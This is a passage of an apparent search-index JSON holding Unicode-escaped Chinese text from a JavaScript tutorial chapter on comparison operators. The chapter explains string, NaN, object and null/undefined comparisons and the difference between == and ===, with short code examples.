\u7801\u70b9\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002 1 'cat' > 'Cat' // true' \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5c0f\u5199\u7684 c \u7684 Unicode \u7801\u70b9\uff08 99 \uff09\u5927\u4e8e\u5927\u5199\u7684 C \u7684 Unicode \u7801\u70b9\uff08 67 \uff09\uff0c\u6240\u4ee5\u8fd4\u56de true \u3002 \u7531\u4e8e\u6240\u6709\u5b57\u7b26\u90fd\u6709 Unicode \u7801\u70b9\uff0c\u56e0\u6b64\u6c49\u5b57\u4e5f\u53ef\u4ee5\u6bd4\u8f83\u3002 1 '\u5927' > '\u5c0f' // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u201c\u5927\u201d\u7684 Unicode \u7801\u70b9\u662f22823\uff0c\u201c\u5c0f\u201d\u662f23567\uff0c\u56e0\u6b64\u8fd4\u56de false \u3002 \u975e\u76f8\u7b49\u8fd0\u7b97\u7b26\uff1a\u975e\u5b57\u7b26\u4e32\u7684\u6bd4\u8f83 \u00b6 \u5982\u679c\u4e24\u4e2a\u8fd0\u7b97\u5b50\u4e4b\u4e2d\uff0c\u81f3\u5c11\u6709\u4e00\u4e2a\u4e0d\u662f\u5b57\u7b26\u4e32\uff0c\u9700\u8981\u5206\u6210\u4ee5\u4e0b\u4e24\u79cd\u60c5\u51b5\u3002 \uff081\uff09\u539f\u59cb\u7c7b\u578b\u503c \u5982\u679c\u4e24\u4e2a\u8fd0\u7b97\u5b50\u90fd\u662f\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u5219\u662f\u5148\u8f6c\u6210\u6570\u503c\u518d\u6bd4\u8f83\u3002 1 2 3 4 5 6 7 8 9 10 11 5 > '4' // true // \u7b49\u540c\u4e8e 5 > Number('4') // \u5373 5 > 4 true > false // true // \u7b49\u540c\u4e8e Number(true) > Number(false) // \u5373 1 > 0 2 > true // true // \u7b49\u540c\u4e8e 2 > Number(true) // \u5373 2 > 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b57\u7b26\u4e32\u548c\u5e03\u5c14\u503c\u90fd\u4f1a\u5148\u8f6c\u6210\u6570\u503c\uff0c\u518d\u8fdb\u884c\u6bd4\u8f83\u3002 \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u4e0e NaN \u7684\u6bd4\u8f83\u3002\u4efb\u4f55\u503c\uff08\u5305\u62ec NaN \u672c\u8eab\uff09\u4e0e NaN \u4f7f\u7528\u975e\u76f8\u7b49\u8fd0\u7b97\u7b26\u8fdb\u884c\u6bd4\u8f83\uff0c\u8fd4\u56de\u7684\u90fd\u662f false \u3002 1 2 3 4 5 6 1 > NaN // false 1 <= NaN // false '1' > NaN // false '1' <= NaN // false NaN > NaN // false NaN <= NaN // false \uff082\uff09\u5bf9\u8c61 \u5982\u679c\u8fd0\u7b97\u5b50\u662f\u5bf9\u8c61\uff0c\u4f1a\u8f6c\u4e3a\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u518d\u8fdb\u884c\u6bd4\u8f83\u3002 \u5bf9\u8c61\u8f6c\u6362\u6210\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u7b97\u6cd5\u662f\u5148\u8c03\u7528 valueOf \u65b9\u6cd5\uff1b\u5982\u679c\u8fd4\u56de\u7684\u8fd8\u662f\u5bf9\u8c61\uff0c\u518d\u63a5\u7740\u8c03\u7528 toString \u65b9\u6cd5\uff0c\u8be6\u7ec6\u89e3\u91ca\u53c2\u89c1\u300a\u6570\u636e\u7c7b\u578b\u7684\u8f6c\u6362\u300b\u4e00\u7ae0\u3002 1 2 3 4 5 6 7 8 9 var x = [ 2 ]; x > '11' // true // \u7b49\u540c\u4e8e [2].valueOf().toString() > '11' // \u5373 '2' > '11' x . valueOf = function () { return '1' }; x > '11' // false // \u7b49\u540c\u4e8e [2].valueOf() > '11' // \u5373 '1' > '11' \u4e24\u4e2a\u5bf9\u8c61\u4e4b\u95f4\u7684\u6bd4\u8f83\u4e5f\u662f\u5982\u6b64\u3002 1 2 3 4 5 6 7 8 9 10 11 [ 2 ] > [ 1 ] // true // \u7b49\u540c\u4e8e [2].valueOf().toString() > [1].valueOf().toString() // \u5373 '2' > '1' [ 2 ] > [ 11 ] // true // \u7b49\u540c\u4e8e [2].valueOf().toString() > [11].valueOf().toString() // \u5373 '2' > '11' { x : 2 } >= { x : 1 } // true // \u7b49\u540c\u4e8e { x: 2 }.valueOf().toString() >= { x: 1 }.valueOf().toString() // \u5373 '[object Object]' >= '[object Object]' \u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26 \u00b6 JavaScript \u63d0\u4f9b\u4e24\u79cd\u76f8\u7b49\u8fd0\u7b97\u7b26\uff1a == \u548c === \u3002 \u7b80\u5355\u8bf4\uff0c\u5b83\u4eec\u7684\u533a\u522b\u662f\u76f8\u7b49\u8fd0\u7b97\u7b26\uff08 == \uff09\u6bd4\u8f83\u4e24\u4e2a\u503c\u662f\u5426\u76f8\u7b49\uff0c\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\uff08 === \uff09\u6bd4\u8f83\u5b83\u4eec\u662f\u5426\u4e3a\u201c\u540c\u4e00\u4e2a\u503c\u201d\u3002\u5982\u679c\u4e24\u4e2a\u503c\u4e0d\u662f\u540c\u4e00\u7c7b\u578b\uff0c\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\uff08 === \uff09\u76f4\u63a5\u8fd4\u56de false \uff0c\u800c\u76f8\u7b49\u8fd0\u7b97\u7b26\uff08 == \uff09\u4f1a\u5c06\u5b83\u4eec\u8f6c\u6362\u6210\u540c\u4e00\u4e2a\u7c7b\u578b\uff0c\u518d\u7528\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\u8fdb\u884c\u6bd4\u8f83\u3002 \u672c\u8282\u4ecb\u7ecd\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\u7684\u7b97\u6cd5\u3002 \uff081\uff09\u4e0d\u540c\u7c7b\u578b\u7684\u503c \u5982\u679c\u4e24\u4e2a\u503c\u7684\u7c7b\u578b\u4e0d\u540c\uff0c\u76f4\u63a5\u8fd4\u56de false \u3002 1 2 1 === \"1\" // false true === \"true\" // false \u4e0a\u9762\u4ee3\u7801\u6bd4\u8f83\u6570\u503c\u7684 1 \u4e0e\u5b57\u7b26\u4e32\u7684\u201c1\u201d\u3001\u5e03\u5c14\u503c\u7684 true \u4e0e\u5b57\u7b26\u4e32 \"true\" \uff0c\u56e0\u4e3a\u7c7b\u578b\u4e0d\u540c\uff0c\u7ed3\u679c\u90fd\u662f false \u3002 \uff082\uff09\u540c\u4e00\u7c7b\u7684\u539f\u59cb\u7c7b\u578b\u503c \u540c\u4e00\u7c7b\u578b\u7684\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff08\u6570\u503c\u3001\u5b57\u7b26\u4e32\u3001\u5e03\u5c14\u503c\uff09\u6bd4\u8f83\u65f6\uff0c\u503c\u76f8\u540c\u5c31\u8fd4\u56de true \uff0c\u503c\u4e0d\u540c\u5c31\u8fd4\u56de false \u3002 1 1 === 0x1 // true \u4e0a\u9762\u4ee3\u7801\u6bd4\u8f83\u5341\u8fdb\u5236\u7684 1 \u4e0e\u5341\u516d\u8fdb\u5236\u7684 1 \uff0c\u56e0\u4e3a\u7c7b\u578b\u548c\u503c\u90fd\u76f8\u540c\uff0c\u8fd4\u56de true \u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c NaN \u4e0e\u4efb\u4f55\u503c\u90fd\u4e0d\u76f8\u7b49\uff08\u5305\u62ec\u81ea\u8eab\uff09\u3002\u53e6\u5916\uff0c\u6b63 0 \u7b49\u4e8e\u8d1f 0 \u3002 1 2 NaN === NaN // false + 0 === - 0 // true \uff083\uff09\u590d\u5408\u7c7b\u578b\u503c \u4e24\u4e2a\u590d\u5408\u7c7b\u578b\uff08\u5bf9\u8c61\u3001\u6570\u7ec4\u3001\u51fd\u6570\uff09\u7684\u6570\u636e\u6bd4\u8f83\u65f6\uff0c\u4e0d\u662f\u6bd4\u8f83\u5b83\u4eec\u7684\u503c\u662f\u5426\u76f8\u7b49\uff0c\u800c\u662f\u6bd4\u8f83\u5b83\u4eec\u662f\u5426\u6307\u5411\u540c\u4e00\u4e2a\u5730\u5740\u3002 1 2 3 {} === {} // false [] === [] // false ( function () {} === function () {}) // false \u4e0a\u9762\u4ee3\u7801\u5206\u522b\u6bd4\u8f83\u4e24\u4e2a\u7a7a\u5bf9\u8c61\u3001\u4e24\u4e2a\u7a7a\u6570\u7ec4\u3001\u4e24\u4e2a\u7a7a\u51fd\u6570\uff0c\u7ed3\u679c\u90fd\u662f\u4e0d\u76f8\u7b49\u3002\u539f\u56e0\u662f\u5bf9\u4e8e\u590d\u5408\u7c7b\u578b\u7684\u503c\uff0c\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u6bd4\u8f83\u7684\u662f\uff0c\u5b83\u4eec\u662f\u5426\u5f15\u7528\u540c\u4e00\u4e2a\u5185\u5b58\u5730\u5740\uff0c\u800c\u8fd0\u7b97\u7b26\u4e24\u8fb9\u7684\u7a7a\u5bf9\u8c61\u3001\u7a7a\u6570\u7ec4\u3001\u7a7a\u51fd\u6570\u7684\u503c\uff0c\u90fd\u5b58\u653e\u5728\u4e0d\u540c\u7684\u5185\u5b58\u5730\u5740\uff0c\u7ed3\u679c\u5f53\u7136\u662f false \u3002 \u5982\u679c\u4e24\u4e2a\u53d8\u91cf\u5f15\u7528\u540c\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5219\u5b83\u4eec\u76f8\u7b49\u3002 1 2 3 var v1 = {}; var v2 = v1 ; v1 === v2 // true \u6ce8\u610f\uff0c\u5bf9\u4e8e\u4e24\u4e2a\u5bf9\u8c61\u7684\u6bd4\u8f83\uff0c\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\u6bd4\u8f83\u7684\u662f\u5730\u5740\uff0c\u800c\u5927\u4e8e\u6216\u5c0f\u4e8e\u8fd0\u7b97\u7b26\u6bd4\u8f83\u7684\u662f\u503c\u3002 1 2 3 4 5 6 var obj1 = {}; var obj2 = {}; obj1 > obj2 // false obj1 < obj2 // false obj1 === obj2 // false \u4e0a\u9762\u7684\u4e09\u4e2a\u6bd4\u8f83\uff0c\u524d\u4e24\u4e2a\u6bd4\u8f83\u7684\u662f\u503c\uff0c\u6700\u540e\u4e00\u4e2a\u6bd4\u8f83\u7684\u662f\u5730\u5740\uff0c\u6240\u4ee5\u90fd\u8fd4\u56de false \u3002 \uff084\uff09undefined \u548c null undefined \u548c null \u4e0e\u81ea\u8eab\u4e25\u683c\u76f8\u7b49\u3002 1 2 undefined === undefined // true null === null // true \u7531\u4e8e\u53d8\u91cf\u58f0\u660e\u540e\u9ed8\u8ba4\u503c\u662f undefined \uff0c\u56e0\u6b64\u4e24\u4e2a\u53ea\u58f0\u660e\u672a\u8d4b\u503c\u7684\u53d8\u91cf\u662f\u76f8\u7b49\u7684\u3002 1 2 3 var v1 ; var v2 ; v1 === v2 // true \u4e25\u683c\u4e0d\u76f8\u7b49\u8fd0\u7b97\u7b26 \u00b6 \u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\u6709\u4e00\u4e2a\u5bf9\u5e94\u7684\u201c\u4e25\u683c\u4e0d\u76f8\u7b49\u8fd0\u7b97\u7b26\u201d\uff08 !== \uff09\uff0c\u5b83\u7684\u7b97\u6cd5\u5c31\u662f\u5148\u6c42\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\u7684\u7ed3\u679c\uff0c\u7136\u540e\u8fd4\u56de\u76f8\u53cd\u503c\u3002 1 2 3 1 !== '1' // true // \u7b49\u540c\u4e8e ! ( 1 === '1' ) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u611f\u53f9\u53f7 ! \u662f\u6c42\u51fa\u540e\u9762\u8868\u8fbe\u5f0f\u7684\u76f8\u53cd\u503c\u3002 \u76f8\u7b49\u8fd0\u7b97\u7b26 \u00b6 \u76f8\u7b49\u8fd0\u7b97\u7b26\u7528\u6765\u6bd4\u8f83\u76f8\u540c\u7c7b\u578b\u7684\u6570\u636e\u65f6\uff0c\u4e0e\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\u5b8c\u5168\u4e00\u6837\u3002 1 2 3 1 == 1.0 // \u7b49\u540c\u4e8e 1 === 1.0 \u6bd4\u8f83\u4e0d\u540c\u7c7b\u578b\u7684\u6570\u636e\u65f6\uff0c\u76f8\u7b49\u8fd0\u7b97\u7b26\u4f1a\u5148\u5c06\u6570\u636e\u8fdb\u884c\u7c7b\u578b\u8f6c\u6362\uff0c\u7136\u540e\u518d\u7528\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\u6bd4\u8f83\u3002\u4e0b\u9762\u5206\u6210\u51e0\u79cd\u60c5\u51b5\uff0c\u8ba8\u8bba\u4e0d\u540c\u7c7b\u578b\u7684\u503c\u4e92\u76f8\u6bd4\u8f83\u7684\u89c4\u5219\u3002 \uff081\uff09\u539f\u59cb\u7c7b\u578b\u503c \u539f\u59cb\u7c7b\u578b\u7684\u503c\u4f1a\u8f6c\u6362\u6210\u6570\u503c\u518d\u8fdb\u884c\u6bd4\u8f83\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 1 == true // true // \u7b49\u540c\u4e8e 1 === Number(true) 0 == false // true // \u7b49\u540c\u4e8e 0 === Number(false) 2 == true // false // \u7b49\u540c\u4e8e 2 === Number(true) 2 == false // false // \u7b49\u540c\u4e8e 2 === Number(false) 'true' == true // false // \u7b49\u540c\u4e8e Number('true') === Number(true) // \u7b49\u540c\u4e8e NaN === 1 '' == 0 // true // \u7b49\u540c\u4e8e Number('') === 0 // \u7b49\u540c\u4e8e 0 === 0 '' == false // true // \u7b49\u540c\u4e8e Number('') === Number(false) // \u7b49\u540c\u4e8e 0 === 0 '1' == true // true // \u7b49\u540c\u4e8e Number('1') === Number(true) // \u7b49\u540c\u4e8e 1 === 1 '\\n 123 \\t' == 123 // true // \u56e0\u4e3a\u5b57\u7b26\u4e32\u8f6c\u4e3a\u6570\u5b57\u65f6\uff0c\u7701\u7565\u524d\u7f6e\u548c\u540e\u7f6e\u7684\u7a7a\u683c \u4e0a\u9762\u4ee3\u7801\u5c06\u5b57\u7b26\u4e32\u548c\u5e03\u5c14\u503c\u90fd\u8f6c\u4e3a\u6570\u503c\uff0c\u7136\u540e\u518d\u8fdb\u884c\u6bd4\u8f83\u3002\u5177\u4f53\u7684\u5b57\u7b26\u4e32\u4e0e\u5e03\u5c14\u503c\u7684\u7c7b\u578b\u8f6c\u6362\u89c4\u5219\uff0c\u53c2\u89c1\u300a\u6570\u636e\u7c7b\u578b\u8f6c\u6362\u300b\u4e00\u7ae0\u3002 \uff082\uff09\u5bf9\u8c61\u4e0e\u539f\u59cb\u7c7b\u578b\u503c\u6bd4\u8f83 \u5bf9\u8c61\uff08\u8fd9\u91cc\u6307\u5e7f\u4e49\u7684\u5bf9\u8c61\uff0c\u5305\u62ec\u6570\u7ec4\u548c\u51fd\u6570\uff09\u4e0e\u539f\u59cb\u7c7b\u578b\u7684\u503c\u6bd4\u8f83\u65f6\uff0c\u5bf9\u8c61\u8f6c\u6362\u6210\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u518d\u8fdb\u884c\u6bd4\u8f83\u3002 \u5177\u4f53\u6765\u8bf4\uff0c\u5148\u8c03\u7528\u5bf9\u8c61\u7684 valueOf() \u65b9\u6cd5\uff0c\u5982\u679c\u5f97\u5230\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u5c31\u6309\u7167\u4e0a\u4e00\u5c0f\u8282\u7684\u89c4\u5219\uff0c\u4e92\u76f8\u6bd4\u8f83\uff1b\u5982\u679c\u5f97\u5230\u7684\u8fd8\u662f\u5bf9\u8c61\uff0c\u5219\u518d\u8c03\u7528 toString() \u65b9\u6cd5\uff0c\u5f97\u5230\u5b57\u7b26\u4e32\u5f62\u5f0f\uff0c\u518d\u8fdb\u884c\u6bd4\u8f83\u3002 \u4e0b\u9762\u662f\u6570\u7ec4\u4e0e\u539f\u59cb\u7c7b\u578b\u503c\u6bd4\u8f83\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 // \u6570\u7ec4\u4e0e\u6570\u503c\u7684\u6bd4\u8f83 [ 1 ] == 1 // true // \u6570\u7ec4\u4e0e\u5b57\u7b26\u4e32\u7684\u6bd4\u8f83 [ 1 ] == '1' // true [ 1 , 2 ] == '1,2' // true // \u5bf9\u8c61\u4e0e\u5e03\u5c14\u503c\u7684\u6bd4\u8f83 [ 1 ] == true // true [ 2 ] == true // false \u4e0a\u9762\u4f8b\u5b50\u4e2d\uff0cJavaScript \u5f15\u64ce\u4f1a\u5148\u5bf9\u6570\u7ec4 [1] \u8c03\u7528\u6570\u7ec4\u7684 valueOf() \u65b9\u6cd5\uff0c\u7531\u4e8e\u8fd4\u56de\u7684\u8fd8\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u6240\u4ee5\u4f1a\u63a5\u7740\u8c03\u7528\u6570\u7ec4\u7684 toString() \u65b9\u6cd5\uff0c\u5f97\u5230\u5b57\u7b26\u4e32\u5f62\u5f0f\uff0c\u518d\u6309\u7167\u4e0a\u4e00\u5c0f\u8282\u7684\u89c4\u5219\u8fdb\u884c\u6bd4\u8f83\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u66f4\u76f4\u63a5\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 const obj = { valueOf : function () { console . log ( '\u6267\u884c valueOf()' ); return obj ; }, toString : function () { console . log ( '\u6267\u884c toString()' ); return 'foo' ; } }; obj == 'foo' // \u6267\u884c valueOf() // \u6267\u884c toString() // true \u4e0a\u9762\u4f8b\u5b50\u4e2d\uff0c obj \u662f\u4e00\u4e2a\u81ea\u5b9a\u4e49\u4e86 valueOf() \u548c toString() \u65b9\u6cd5\u7684\u5bf9\u8c61\u3002\u8fd9\u4e2a\u5bf9\u8c61\u4e0e\u5b57\u7b26\u4e32 'foo' \u8fdb\u884c\u6bd4\u8f83\u65f6\uff0c\u4f1a\u4f9d\u6b21\u8c03\u7528 valueOf() \u548c toString() \u65b9\u6cd5\uff0c\u6700\u540e\u8fd4\u56de 'foo' \uff0c\u6240\u4ee5\u6bd4\u8f83\u7ed3\u679c\u662f true \u3002 \uff083\uff09undefined \u548c null undefined \u548c null \u53ea\u6709\u4e0e\u81ea\u8eab\u6bd4\u8f83\uff0c\u6216\u8005\u4e92\u76f8\u6bd4\u8f83\u65f6\uff0c\u624d\u4f1a\u8fd4\u56de true \uff1b\u4e0e\u5176\u4ed6\u7c7b\u578b\u7684\u503c\u6bd4\u8f83\u65f6\uff0c\u7ed3\u679c\u90fd\u4e3a false \u3002 1 2 3 4 5 6 7 8 9 undefined == undefined // true null == null // true undefined == null // true false == null // false false == undefined // false 0 == null // false 0 == undefined // false \uff084\uff09\u76f8\u7b49\u8fd0\u7b97\u7b26\u7684\u7f3a\u70b9 \u76f8\u7b49\u8fd0\u7b97\u7b26\u9690\u85cf\u7684\u7c7b\u578b\u8f6c\u6362\uff0c\u4f1a\u5e26\u6765\u4e00\u4e9b\u8fdd\u53cd\u76f4\u89c9\u7684\u7ed3\u679c\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 0 == '' // true 0 == '0' // true 2 == true // false 2 == false // false false == 'false' // false false == '0' // true false == undefined // false false == null // false null == undefined // true ' \\t\\r\\n ' == 0 // true \u4e0a\u9762\u8fd9\u4e9b\u8868\u8fbe\u5f0f\u90fd\u4e0d\u540c\u4e8e\u76f4\u89c9\uff0c\u5f88\u5bb9\u6613\u51fa\u9519\u3002\u56e0\u6b64\u5efa\u8bae\u4e0d\u8981\u4f7f\u7528\u76f8\u7b49\u8fd0\u7b97\u7b26\uff08 == \uff09\uff0c\u6700\u597d\u53ea\u4f7f\u7528\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\uff08 === \uff09\u3002 \u4e0d\u76f8\u7b49\u8fd0\u7b97\u7b26 \u00b6 \u76f8\u7b49\u8fd0\u7b97\u7b26\u6709\u4e00\u4e2a\u5bf9\u5e94\u7684\u201c\u4e0d\u76f8\u7b49\u8fd0\u7b97\u7b26\u201d\uff08 != \uff09\uff0c\u5b83\u7684\u7b97\u6cd5\u5c31\u662f\u5148\u6c42\u76f8\u7b49\u8fd0\u7b97\u7b26\u7684\u7ed3\u679c\uff0c\u7136\u540e\u8fd4\u56de\u76f8\u53cd\u503c\u3002 1 2 3 4 1 != '1' // false // \u7b49\u540c\u4e8e ! ( 1 == '1' )","title":"\u6bd4\u8f83\u8fd0\u7b97\u7b26"},{"location":"operators/comparison/#_1","text":"","title":"\u6bd4\u8f83\u8fd0\u7b97\u7b26"},{"location":"operators/comparison/#_2","text":"\u6bd4\u8f83\u8fd0\u7b97\u7b26\u7528\u4e8e\u6bd4\u8f83\u4e24\u4e2a\u503c\u7684\u5927\u5c0f\uff0c\u7136\u540e\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u6ee1\u8db3\u6307\u5b9a\u7684\u6761\u4ef6\u3002 1 2 > 1 // true \u4e0a\u9762\u4ee3\u7801\u6bd4\u8f83 2 \u662f\u5426\u5927\u4e8e 1 \uff0c\u8fd4\u56de true \u3002 \u6ce8\u610f\uff0c\u6bd4\u8f83\u8fd0\u7b97\u7b26\u53ef\u4ee5\u6bd4\u8f83\u5404\u79cd\u7c7b\u578b\u7684\u503c\uff0c\u4e0d\u4ec5\u4ec5\u662f\u6570\u503c\u3002 JavaScript \u4e00\u5171\u63d0\u4f9b\u4e868\u4e2a\u6bd4\u8f83\u8fd0\u7b97\u7b26\u3002 > \u5927\u4e8e\u8fd0\u7b97\u7b26 < \u5c0f\u4e8e\u8fd0\u7b97\u7b26 <= \u5c0f\u4e8e\u6216\u7b49\u4e8e\u8fd0\u7b97\u7b26 >= \u5927\u4e8e\u6216\u7b49\u4e8e\u8fd0\u7b97\u7b26 == \u76f8\u7b49\u8fd0\u7b97\u7b26 === \u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26 != \u4e0d\u76f8\u7b49\u8fd0\u7b97\u7b26 !== \u4e25\u683c\u4e0d\u76f8\u7b49\u8fd0\u7b97\u7b26 \u8fd9\u516b\u4e2a\u6bd4\u8f83\u8fd0\u7b97\u7b26\u5206\u6210\u4e24\u7c7b\uff1a\u76f8\u7b49\u6bd4\u8f83\u548c\u975e\u76f8\u7b49\u6bd4\u8f83\u3002\u4e24\u8005\u7684\u89c4\u5219\u662f\u4e0d\u4e00\u6837\u7684\uff0c\u5bf9\u4e8e\u975e\u76f8\u7b49\u7684\u6bd4\u8f83\uff0c\u7b97\u6cd5\u662f\u5148\u770b\u4e24\u4e2a\u8fd0\u7b97\u5b50\u662f\u5426\u90fd\u662f\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u662f\u7684\uff0c\u5c31\u6309\u7167\u5b57\u5178\u987a\u5e8f\u6bd4\u8f83\uff08\u5b9e\u9645\u4e0a\u662f\u6bd4\u8f83 Unicode \u7801\u70b9\uff09\uff1b\u5426\u5219\uff0c\u5c06\u4e24\u4e2a\u8fd0\u7b97\u5b50\u90fd\u8f6c\u6210\u6570\u503c\uff0c\u518d\u6bd4\u8f83\u6570\u503c\u7684\u5927\u5c0f\u3002","title":"\u6982\u8ff0"},{"location":"operators/comparison/#_3","text":"\u5b57\u7b26\u4e32\u6309\u7167\u5b57\u5178\u987a\u5e8f\u8fdb\u884c\u6bd4\u8f83\u3002 1 2 'cat' > 'dog' // false 'cat' > 'catalog' // false JavaScript \u5f15\u64ce\u5185\u90e8\u9996\u5148\u6bd4\u8f83\u9996\u5b57\u7b26\u7684 Unicode \u7801\u70b9\u3002\u5982\u679c\u76f8\u7b49\uff0c\u518d\u6bd4\u8f83\u7b2c\u4e8c\u4e2a\u5b57\u7b26\u7684 Unicode \u7801\u70b9\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002 1 'cat' > 'Cat' // true' \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5c0f\u5199\u7684 c \u7684 Unicode \u7801\u70b9\uff08 99 \uff09\u5927\u4e8e\u5927\u5199\u7684 C \u7684 Unicode \u7801\u70b9\uff08 67 \uff09\uff0c\u6240\u4ee5\u8fd4\u56de true \u3002 \u7531\u4e8e\u6240\u6709\u5b57\u7b26\u90fd\u6709 Unicode \u7801\u70b9\uff0c\u56e0\u6b64\u6c49\u5b57\u4e5f\u53ef\u4ee5\u6bd4\u8f83\u3002 1 '\u5927' > '\u5c0f' // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u201c\u5927\u201d\u7684 Unicode \u7801\u70b9\u662f22823\uff0c\u201c\u5c0f\u201d\u662f23567\uff0c\u56e0\u6b64\u8fd4\u56de false \u3002","title":"\u975e\u76f8\u7b49\u8fd0\u7b97\u7b26\uff1a\u5b57\u7b26\u4e32\u7684\u6bd4\u8f83"},{"location":"operators/comparison/#_4","text":"\u5982\u679c\u4e24\u4e2a\u8fd0\u7b97\u5b50\u4e4b\u4e2d\uff0c\u81f3\u5c11\u6709\u4e00\u4e2a\u4e0d\u662f\u5b57\u7b26\u4e32\uff0c\u9700\u8981\u5206\u6210\u4ee5\u4e0b\u4e24\u79cd\u60c5\u51b5\u3002 \uff081\uff09\u539f\u59cb\u7c7b\u578b\u503c \u5982\u679c\u4e24\u4e2a\u8fd0\u7b97\u5b50\u90fd\u662f\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u5219\u662f\u5148\u8f6c\u6210\u6570\u503c\u518d\u6bd4\u8f83\u3002 1 2 3 4 5 6 7 8 9 10 11 5 > '4' // true // \u7b49\u540c\u4e8e 5 > Number('4') // \u5373 5 > 4 true > false // true // \u7b49\u540c\u4e8e Number(true) > Number(false) // \u5373 1 > 0 2 > true // true // \u7b49\u540c\u4e8e 2 > Number(true) // \u5373 2 > 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b57\u7b26\u4e32\u548c\u5e03\u5c14\u503c\u90fd\u4f1a\u5148\u8f6c\u6210\u6570\u503c\uff0c\u518d\u8fdb\u884c\u6bd4\u8f83\u3002 \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u4e0e NaN \u7684\u6bd4\u8f83\u3002\u4efb\u4f55\u503c\uff08\u5305\u62ec NaN \u672c\u8eab\uff09\u4e0e NaN \u4f7f\u7528\u975e\u76f8\u7b49\u8fd0\u7b97\u7b26\u8fdb\u884c\u6bd4\u8f83\uff0c\u8fd4\u56de\u7684\u90fd\u662f false \u3002 1 2 3 4 5 6 1 > NaN // false 1 <= NaN // false '1' > NaN // false '1' <= NaN // false NaN > NaN // false NaN <= NaN // false \uff082\uff09\u5bf9\u8c61 \u5982\u679c\u8fd0\u7b97\u5b50\u662f\u5bf9\u8c61\uff0c\u4f1a\u8f6c\u4e3a\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u518d\u8fdb\u884c\u6bd4\u8f83\u3002 \u5bf9\u8c61\u8f6c\u6362\u6210\u539f\u59cb\u7c7b\u578b\u7684\u503c\uff0c\u7b97\u6cd5\u662f\u5148\u8c03\u7528 valueOf \u65b9\u6cd5\uff1b\u5982\u679c\u8fd4\u56de\u7684\u8fd8\u662f\u5bf9\u8c61\uff0c\u518d\u63a5\u7740\u8c03\u7528 toString \u65b9\u6cd5\uff0c\u8be6\u7ec6\u89e3\u91ca\u53c2\u89c1\u300a\u6570\u636e\u7c7b\u578b\u7684\u8f6c\u6362\u300b\u4e00\u7ae0\u3002 1 2 3 4 5 6 7 8 9 var x = [ 2 ]; x > '11' // true // \u7b49\u540c\u4e8e [2].valueOf().toString() > '11' // \u5373 '2' > '11' x . valueOf = function () { return '1' }; x > '11' // false // \u7b49\u540c\u4e8e [2].valueOf() > '11' // \u5373 '1' > '11' \u4e24\u4e2a\u5bf9\u8c61\u4e4b\u95f4\u7684\u6bd4\u8f83\u4e5f\u662f\u5982\u6b64\u3002 1 2 3 4 5 6 7 8 9 10 11 [ 2 ] > [ 1 ] // true // \u7b49\u540c\u4e8e [2].valueOf().toString() > [1].valueOf().toString() // \u5373 '2' > '1' [ 2 ] > [ 11 ] // true // \u7b49\u540c\u4e8e [2].valueOf().toString() > [11].valueOf().toString() // \u5373 '2' > '11' { x : 2 } >= { x : 1 } // true // \u7b49\u540c\u4e8e { x: 2 }.valueOf().toString() >= { x: 1 }.valueOf().toString() // \u5373 '[object Object]' >= '[object Object]'","title":"\u975e\u76f8\u7b49\u8fd0\u7b97\u7b26\uff1a\u975e\u5b57\u7b26\u4e32\u7684\u6bd4\u8f83"},{"location":"operators/comparison/#_5","text":"JavaScript \u63d0\u4f9b\u4e24\u79cd\u76f8\u7b49\u8fd0\u7b97\u7b26\uff1a == \u548c === \u3002 \u7b80\u5355\u8bf4\uff0c\u5b83\u4eec\u7684\u533a\u522b\u662f\u76f8\u7b49\u8fd0\u7b97\u7b26\uff08 == \uff09\u6bd4\u8f83\u4e24\u4e2a\u503c\u662f\u5426\u76f8\u7b49\uff0c\u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26\uff08 === 